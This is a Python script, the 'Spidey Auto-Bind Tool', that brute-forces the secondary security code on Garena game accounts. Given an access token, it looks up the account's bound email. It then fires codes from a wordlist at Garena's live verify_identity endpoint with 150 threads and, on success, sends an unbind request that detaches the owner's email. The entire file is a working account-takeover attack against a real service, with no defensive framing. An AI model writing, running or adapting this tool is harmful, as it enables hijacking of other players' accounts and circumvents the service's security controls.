import requests
import os
import sys
import json
import time
import hashlib
import urllib.parse
import urllib3
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def draw_header(subtitle=""):
    clear_screen()
    spidey_logo = f"""{Colors.CYAN}
    ███████╗██████╗ ██╗██████╗ ███████╗██╗   ██╗
    ██╔════╝██╔══██╗██║██╔══██╗██╔════╝╚██╗ ██╔╝
    ███████╗██████╔╝██║██║  ██║█████╗   ╚████╔╝ 
    ╚════██║██╔═══╝ ██║██║  ██║██╔══╝    ╚██╔╝  
    ███████║██║     ██║██████╔╝███████╗   ██║   
    ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝   ╚═╝   {Colors.END}"""
    print(spidey_logo)
    print(f"{Colors.MAGENTA}●{'═' * 15} {Colors.WHITE}{Colors.BOLD}Spidey Auto-Bind Tool {Colors.END}{Colors.MAGENTA}{'═' * 15}●{Colors.END}\n")
    print(f" {Colors.GREEN}⊛ STATUS    : {Colors.WHITE}AUTOMATED MODE (150 Workers){Colors.END}")
    print(f"\n{Colors.MAGENTA}●{'═' * 48}●{Colors.END}\n")
    if subtitle:
        print(f" {Colors.CYAN}CURRENT OPTION : {Colors.WHITE}{subtitle}{Colors.END}")
        print(f"\n{Colors.MAGENTA}●{'═' * 48}●{Colors.END}\n")

def input_prompt(msg):
    return input(f"{Colors.CYAN}» {Colors.WHITE}{msg} : {Colors.END}").strip()

# ---------- Global stop flag & result ----------
stop_event = threading.Event()
found_code = None
found_identity = None
found_lock = threading.Lock()

def worker(email, access_token, code_queue, total_codes, progress_counter):
    """Worker thread: tests codes from the queue until success or empty."""
    global found_code, found_identity
    while not stop_event.is_set():
        try:
            code = code_queue.get(timeout=0.5)
        except queue.Empty:
            break
        if stop_event.is_set():
            break

        # Progress update (approximate)
        with progress_counter[0] as lock:
            progress_counter[1] += 1
            if progress_counter[1] % 10 == 0:
                print(f" {Colors.YELLOW}» Progress: {progress_counter[1]}/{total_codes} codes tested...{Colors.END}", end="\r")

        # Compute SHA-256 of the code
        hashed_sec_code = hashlib.sha256(code.encode('utf-8')).hexdigest()
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": email,
            "app_id": "100067",
            "access_token": access_token,
            "secondary_password": hashed_sec_code
        }
        headers = {
            "User-Agent": "GarenaMSDK/4.0.30",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=8)
            res_json = resp.json()
            if "identity_token" in res_json and res_json.get("identity_token"):
                with found_lock:
                    if not found_code and not stop_event.is_set():
                        found_code = code
                        found_identity = res_json.get("identity_token")
                        stop_event.set()  # stop all workers
                break
        except Exception:
            pass

        code_queue.task_done()  # not strictly needed but good practice
    return

def automated_unbind_bypass():
    draw_header("AUTOMATIC UNBIND - SECURITY CODE BYPASS (150 Workers)")
    
    # Check if HLO.txt exists
    if not os.path.exists("HLO.txt"):
        print(f" {Colors.RED}⊛ Error: 'HLO.txt' file nahi mili! Pehle is name se file banao.{Colors.END}")
        return

    access_token = input_prompt("Enter Access Token")
    if not access_token:
        print(f" {Colors.RED}⊛ Token empty nahi ho sakta!{Colors.END}")
        return

    # 1. Fetch bound email
    print(f"\n {Colors.MAGENTA}⊛ [1/3]{Colors.END} {Colors.WHITE}Fetching Bound Email automatically...{Colors.END}")
    try:
        url_info = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        info_payload = {'app_id': "100067", 'access_token': access_token}
        info_headers = {'User-Agent': "GarenaMSDK/4.0.30"}
        r_info = requests.get(url_info, params=info_payload, headers=info_headers, timeout=10)
        email = r_info.json().get("email", "")
    except Exception as e:
        print(f" {Colors.RED}⊛ Error connecting to Garena: {str(e)}{Colors.END}")
        return
        
    if not email:
        print(f" {Colors.RED}⊛ Account par koi bound email nahi mila!{Colors.END}")
        return
        
    print(f" {Colors.GREEN}⊛ Bound Email Found: {email}{Colors.END}")

    # 2. Read codes from HLO.txt
    print(f"\n {Colors.MAGENTA}⊛ [2/3]{Colors.END} {Colors.WHITE}Reading codes from HLO.txt & attacking with 150 workers...{Colors.END}")
    
    with open("HLO.txt", "r") as f:
        codes = [line.strip() for line in f if line.strip()]

    if not codes:
        print(f" {Colors.RED}⊛ HLO.txt is empty!{Colors.END}")
        return

    total_codes = len(codes)
    code_queue = queue.Queue()
    for c in codes:
        code_queue.put(c)

    # Reset global state
    global stop_event, found_code, found_identity
    stop_event.clear()
    found_code = None
    found_identity = None

    # Progress counter: [lock, counter]
    progress_counter = [threading.Lock(), 0]

    # Start workers
    max_workers = 150
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for _ in range(max_workers):
            futures.append(executor.submit(worker, email, access_token, code_queue, total_codes, progress_counter))

        # Wait for any worker to finish or all done
        for future in as_completed(futures):
            if stop_event.is_set():
                # Cancel remaining futures (optional)
                for f in futures:
                    f.cancel()
                break
        # If loop completes naturally, all workers finished without finding code.

    # Clear progress line
    print(" " * 80, end="\r")

    # 3. Check result
    if found_code and found_identity:
        print(f"\n {Colors.GREEN}█████████████████████████████████████████{Colors.END}")
        print(f" {Colors.GREEN}⊛ VERIFICATION SUCCESSFUL!{Colors.END}")
        print(f" {Colors.GREEN}⊛ CRACKED SECURITY CODE: {Colors.BOLD}{Colors.WHITE}{found_code}{Colors.END}")
        print(f" {Colors.GREEN}█████████████████████████████████████████{Colors.END}")
        
        # Final Unbind Request
        print(f"\n {Colors.MAGENTA}⊛ [3/3]{Colors.END} {Colors.WHITE}Sending final Unbind Request...{Colors.END}")
        unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        unbind_data = {"app_id": "100067", "access_token": access_token, "identity_token": found_identity}
        headers = {
            "User-Agent": "GarenaMSDK/4.0.30",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"
        }
        try:
            final_resp = requests.post(unbind_url, headers=headers, data=unbind_data)
            print(f" {Colors.CYAN}⊛ Server Response: {final_resp.text}{Colors.END}")
        except Exception as e:
            print(f" {Colors.RED}⊛ Request failed: {str(e)}{Colors.END}")
    else:
        print(f"\n {Colors.RED}⊛ Identity verification FAILED! HLO.txt me se koi code match nahi hua.{Colors.END}")

    print(f"\n{Colors.MAGENTA}●{'═' * 20} SCRIPT EXITED {'═' * 20}●{Colors.END}\n")

if __name__ == "__main__":
    try:
        automated_unbind_bypass()
    except KeyboardInterrupt:
        print(f"\n\n {Colors.RED}⊛ Process interrupted by user. Exiting...👋{Colors.END}")
